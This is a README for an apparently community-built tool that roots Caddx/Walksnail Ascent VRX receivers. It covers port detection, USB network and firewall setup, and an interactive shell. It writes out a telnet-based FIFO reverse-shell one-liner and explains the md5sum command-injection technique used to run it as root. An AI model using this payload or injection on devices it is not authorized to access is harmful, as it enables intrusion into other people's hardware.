# Ascent VRX Root Tool

A friendly, interactive wrapper around the public **Caddx / Walksnail Ascent VRX**
rooting research. It:

1. lets you pick the VRX USB serial port and **verifies it is really a Caddx VRX**
   using the official updater handshake (`GET_DEVICE_INFO`);
2. checks the **USB RNDIS network** configuration and offers to fix it (static IP);
3. checks/creates the **Windows Firewall** rule needed for the reverse shell;
4. injects the payload, waits for the VRX to connect back, and gives you an
   **interactive root shell**.

It writes only temporary files under `/tmp` on the device. It does not flash or
modify the firmware.

> **Use only on hardware you own or are authorized to test.** Rooting can brick a
> device if interrupted. This is community research, not an official Caddx tool.

---

## Requirements

| Item | Notes |
| --- | --- |
| Windows 10 / 11 | Network auto-configuration uses PowerShell. Serial-only use works on Linux/macOS. |
| Python 3.10+ | Required. If it is missing (or only the Microsoft Store stub exists), the launcher offers to install it with winget. |
| pyserial 3.5+ | Checked on every run. Missing releases are offered for installation and older ones for upgrade; the exact `pip` command is printed if you decline or it fails. |
| USB **data** cable | Many USB-C cables are charge-only. |
| VRX powered on | The updater service must be running (normal boot is fine). |
| Administrator rights | Only needed when changing the RNDIS adapter or creating a firewall rule. UAC is requested at that moment. |

`AscentVRXRootTool.bat` finds a working Python itself (`python`, then `py -3`,
then `pymanager exec`). If none is available it offers to install the official
**Python Install Manager** and the latest Python 3 runtime through **winget**;
declining prints the manual commands and the python.org link. Installing or
upgrading Python/pyserial needs internet access, but only happens once.

Close the Caddx web updater, browser serial tab, or any serial monitor before
starting: only one program can own the COM port.

---

## Quick start

Double-click **`AscentVRXRootTool.bat`**, or run:

```powershell
cd C:\_Dev\AscentVRXRootTool
python root_tool.py
```

Diagnose without rooting:

```powershell
python root_tool.py --check
```

Non-interactive (accept defaults, apply fixes, root):

```powershell
python root_tool.py --yes
```

---

## The four steps

### 1. Detect the VRX

The tool lists serial ports and highlights likely VRX ports (USB VID `1D77`,
or a description containing `VRX`, `Ascent`, `Caddx` or `Walksnail`).

Before touching the exploit, it opens the port and sends the official
`GET_DEVICE_INFO` command (`0x3C`). A real VRX answers with a 300-byte block, and
the tool shows the model, firmware, SDK, serial number, hardware version and CPU
temperature.

If the handshake fails, you can retry, choose another port, or continue anyway.

### 2. Check the USB network

The VRX exposes a USB composite gadget:

| Interface | Address |
| --- | --- |
| RNDIS network (`usb0`) | `192.168.3.102/24` |
| CDC-ACM serial | your `COMx` |

The host must have an address in `192.168.3.0/24`. The tool looks for the
RNDIS/USB Ethernet adapter and checks its IPv4 configuration and the route to
`192.168.3.102`.

If the adapter has no usable address, it proposes:

```text
Set 192.168.3.103/24 on "USB Ethernet/RNDIS Gadget"
```

and offers to apply it. The previous configuration is saved to:

```text
%LOCALAPPDATA%\AscentVRXRootTool\network_state.json
```

When the session ends, the tool offers to restore it. You can also restore it
later:

```powershell
python root_tool.py --restore-network
```

Manual equivalent (elevated Command Prompt):

```bat
netsh interface ipv4 set address name="Ethernet 5" static 192.168.3.103 255.255.255.0
```

Reachability is checked with ICMP, the ARP/neighbour table, and TCP probes on
common VRX ports (22, 554, 80, 23). A missing ICMP reply is not fatal: the
reverse shell is an **outbound** connection from the VRX, so it can still work.

### 3. Prepare the reverse shell

The device ships `/bin/sh` and `/bin/telnet` (no netcat), so the payload is:

```sh
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | tr -d "\r" | /bin/sh -i 2>&1 | telnet <host-ip> <port> > /tmp/f
```

The tool picks a free local TCP port (default `4444`) and checks for an inbound
Windows Firewall rule named `Ascent VRX Root Tool (TCP <port>)`. If missing, it
offers to create it (limited to `LocalSubnet`). **Without this rule Windows may
silently block the VRX's connection.**

### 4. Root and open the shell

The payload is split into short file names that the firmware's `md5sum` call
executes as shell fragments. This is the published `ar_fpv_upgrade` command
injection; the details are in the
[research write-up](https://hackmd.io/@umeow0716/ryu63HDeGg).

The tool writes the fragments, triggers the launcher, and waits for the VRX to
connect back. When it does, you get an interactive shell.

Type normal Linux commands:

```sh
id
uname -a
df -h
cat /proc/cpuinfo
```

---

## Interactive shell

The root shell runs through a FIFO, not a pseudo-terminal, so the host provides
local echo and line handling.

Local commands (not sent to the VRX):

| Command | Meaning |
| --- | --- |
| `:help` | show local commands |
| `:quit` | close the shell |
| `:echo on` / `:echo off` | local echo of what you type |
| `:raw on` / `:raw off` | send each key immediately |
| `:clear` | clear the console window |
| `:status` | show the peer and current mode |

**Limitations:** because there is no remote tty, `vi`, `nano`, `top`, `less` and
similar full-screen programs will not behave normally. Ctrl+C clears the local
line but cannot interrupt a command already running on the VRX (there is no pty
to deliver the signal); use `timeout`, or close and reopen the shell. Regular
commands, pipes, redirections and shell scripts work fine. Use `cat`, `sed`,
`dd`, etc. for file work.

If the connection drops, the tool offers to re-run the launcher or re-inject the
payload. The script in `/tmp/e` remains until the VRX reboots.

---

## Command-line options

```text
python root_tool.py [options]

  --port COMx        serial port, skip the picker
  --host-ip IP       host address to embed in the payload, skip auto-detection
  --shell-port PORT  local reverse-shell port (default 4444)
  --wait SECONDS     how long to wait for the connection (default 30)
  --check            diagnose ports, network and firewall, then exit
  --restore-network  restore settings saved by a previous run
  --keep-network     keep the USB network settings changed in this run
  -y, --yes          accept recommended defaults and apply fixes
  --verbose          show protocol debug output
  --no-color         disable ANSI colors
  --version          print the version
```

Examples:

```powershell
# A specific port and host address
python root_tool.py --port COM7 --host-ip 192.168.3.103

# Keep the static USB address for next time
python root_tool.py --keep-network

# Check everything, including the device handshake on COM5
python root_tool.py --check --port COM5
```

### Practical notes

`--yes` answers every prompt with the recommended default, but it is **not** a
fully silent mode:

- It still verifies the VRX handshake. If the device does not answer, it aborts
  instead of offering the retry / choose-another-port menu.
- It still shows **UAC prompts** when it applies the static IP or creates the
  firewall rule.
- If the network cannot be made usable, it aborts instead of prompting for a
  manual address.
- On injection failure or a missed callback it gives up rather than offering
  the retry / re-inject menu.
- The reverse shell itself is still interactive; `--yes` cannot type commands
  for you.
- The previous network settings are restored automatically on exit unless you
  pass `--keep-network`.
- If Python itself is missing, the same `--yes` flag passed to
  `AscentVRXRootTool.bat` installs it with winget without asking. That step
  needs internet access.

Recommended unattended invocations:

```powershell
# Safest unattended run: pin the port
python root_tool.py --yes --port COM5

# Do not touch Windows networking at all
python root_tool.py --yes --port COM5 --host-ip 192.168.3.103

# Keep the static USB address after the session
python root_tool.py --yes --keep-network
```

Tip: run `python root_tool.py --check --port COM5` first if you are unsure which
COM port or network adapter the VRX is using.

---

## Troubleshooting

### Python is not installed, or the Microsoft Store opens

The launcher tries `python`, then `py -3`, then `pymanager exec`, and checks for
Python 3.10+. If nothing suitable is found and **winget** is available, it shows
the python.org download link and offers the automatic install side by side:

```
  Prefer a normal installer? Download Python 3.10+ from:
    https://www.python.org/downloads/windows/

Install Python now with winget? [Y/n]
```

Answering yes installs the official **Python Install Manager** and the latest
Python 3 runtime:

```powershell
winget install 9NQ7512CXL7T -e
py install 3
```

The Python Install Manager is the current official manager from python.org. It
provides the `python`, `py` and `pymanager` commands and can be updated later
with `py install --update`. No Python is needed to run this step.

If you decline, winget is unavailable, or the automatic install fails, the
launcher prints those commands plus the python.org link and keeps the window
open.

A message like *“Python was not found; run without arguments to install from
the Microsoft Store”* means the **Store alias** is enabled but real Python is
not installed. The winget install above normally fixes it. If `python` still
opens the Store:

1. **Settings → Apps → Advanced app settings → App execution aliases**
2. Turn **off** `python.exe` and `python3.exe`.
3. Install Python as above (or from
   <https://www.python.org/downloads/windows/>, ticking **Add python.exe to
   PATH** during setup).
4. Close and reopen the terminal (PATH changes do not reach open windows), then
   run `AscentVRXRootTool.bat` again.

`python root_tool.py` also refuses to start on an older interpreter and prints
the interpreter path and the download link.

### pyserial is missing or too old

The tool needs **pyserial 3.5 or newer** and checks it before touching the
serial port:

- **Not installed** → offers *“Install pyserial automatically with pip?”*.
- **Older than 3.5** → warns with the installed version and offers to upgrade.
- **Version unknown** (unusual package layout) → warns and continues.

`--yes` accepts both offers. If you answer no, or `pip` fails, the tool stops
with the exact command to run, for example:

```powershell
"C:\Users\you\AppData\Local\Programs\Python\Python312\python.exe" -m pip install --upgrade "pyserial>=3.5"
```

Use that full path when several Python installations exist, so the package goes
into the interpreter that runs the tool. `--help`, `--version` and
`--restore-network` work without pyserial.

### No serial port appears

- Use a USB **data** cable, not a charge-only cable.
- Power the VRX on and wait for it to boot.
- Check **Device Manager → Ports (COM & LPT)** for `USB Serial Device`.
- Try another USB port (prefer a direct port over a hub).
- Linux: the port is usually `/dev/ttyACM0`.

### The port opens but the handshake fails

- Close the Caddx web updater, browser serial tab, PuTTY or any serial monitor.
- Make sure you selected the VRX's `USB Serial Device`, not a Bluetooth port.
- Unplug/replug the VRX and retry.
- If the device is mid-upgrade, wait for it to finish/reboot.

### No RNDIS / USB Ethernet adapter

- The composite gadget may not have enumerated. Unplug/replug the USB cable.
- Check **Device Manager → Network adapters** for `USB Ethernet/RNDIS Gadget`.
- On some systems Windows needs a moment after the device boots.
- If the adapter exists but is disabled, enable it in Network Connections.

### The adapter has a 169.254.x.x address

That is APIPA: the RNDIS interface has no DHCP server. Apply the proposed static
`192.168.3.103/24` address when the tool offers it.

### VRX is not reachable

- Check the VRX's HDMI output to confirm it is booted.
- Retry after a few seconds; the device may still be starting.
- The reverse shell is outbound, so you can continue even if ICMP is blocked.
- Make sure the host IP in the payload is the address on the RNDIS adapter.

### The VRX never connects back

- Confirm the Windows Firewall rule exists (the tool checks it).
- Third-party antivirus firewalls can also block inbound TCP; allow the port.
- Check that no other program is using the chosen port.
- The VRX may still be running a previous FIFO shell. Reboot the VRX and retry.
- Try `--shell-port 4455` in case something is filtering 4444.

### PowerShell / UAC problems

- Applying the IP and creating the firewall rule need elevation. Accept the UAC
  prompt, or run the terminal as Administrator.
- If PowerShell is blocked by policy, set the address and firewall rule manually
  using the commands printed by the tool.
- If the UAC prompt is dismissed, the tool reports the failure and continues.

### Restore network settings

```powershell
python root_tool.py --restore-network
```

If no saved state exists, set the adapter back to DHCP manually:

```bat
netsh interface ipv4 set address name="Ethernet 5" source=dhcp
```

---

## How it works (short version)

- `GET_DEVICE_INFO` (`0x3C`) identifies the device via the normal updater protocol.
- `0x72` resets/opens the file-receive session.
- `0x73` announces a remote path, size and MD5.
- `0x74` transfers the dummy file content.
- `0x75` finalizes the file and runs `snprintf("md5sum %s", path)` via `popen()`.
- The remote path contains shell metacharacters, so `0x75` executes them as root.
- A long command is split into 5-character `echo` fragments, with `/` encoded
  as `$(pwd|cut -c1)` because the path buffer is only 56 bytes.
- The final fragment runs `/tmp/e` with `sh`, which starts the reverse shell.

References:

- [Walksnail-Ascent-FPV-VRX-Rooting](https://github.com/umeow0716/Walksnail-Ascent-FPV-VRX-Rooting)
- [Vulnerability write-up](https://hackmd.io/@umeow0716/ryu63HDeGg)
- [Caddx VRX Max UDP protocol](https://github.com/CaddxFPV-Tech/Caddx_vrx_max_udp_protocol)
- [AscentWebTool](https://github.com/TaranUA/AscentWebTool) — readable browser updater

---

## Project layout

```text
root_tool.py                     interactive wizard and CLI
AscentVRXRootTool.bat            double-click launcher
pyproject.toml                   ruff configuration (100 columns, py3.10)
requirements.txt                 pyserial
requirements-dev.txt             ruff
.github/workflows/ci.yml         lint + tests on Windows
ascent_root/
  protocol.py                    serial protocol, device info, injection encoder
  network.py                     RNDIS discovery, fixes, firewall, saved state
  shell.py                       telnet-filtered reverse-shell bridge
  ui.py                          console UI
tests/
  test_protocol.py               packet/CRC/device-info/injection tests
  test_network.py                adapter/subnet decision tests
  test_shell.py                  telnet filter, CRLF, line editing tests
  test_simulation.py             fake-VRX end-to-end injection test
  test_root_flow.py              full wizard flow with simulated hardware
  test_dependencies.py           Python guard + pyserial install/upgrade
```

The tool is self-contained: it does not import or need the original research
repository. The links under *References* above point to the public research.

---

## Tests

```powershell
python -m unittest discover -s tests -v
```

The simulation test emulates the VRX serial protocol, verifies the injected
fragments rebuild the exact command, and confirms the simulated device connects
back to the listener. The orchestration test drives the complete wizard with
mocked hardware. Neither test uses a real VRX.

## Development checks

```powershell
python -m pip install -r requirements-dev.txt
python -m ruff check .
python -m ruff format --check .
python -m unittest discover -s tests -v
```

`pyproject.toml` pins the style (100 columns, Python 3.10 target); ruff's default
rule set is used. CI runs the same commands on Windows for Python 3.10 and 3.13.

---

## Credits

- Rooting research and original exploit: **umeow0716**
- Protocol documentation: **CaddxFPV-Tech**
- Readable updater reference: **TaranUA / AscentWebTool**
- This interactive wrapper: built for the Ascent VRX community

No warranty. Use at your own risk.
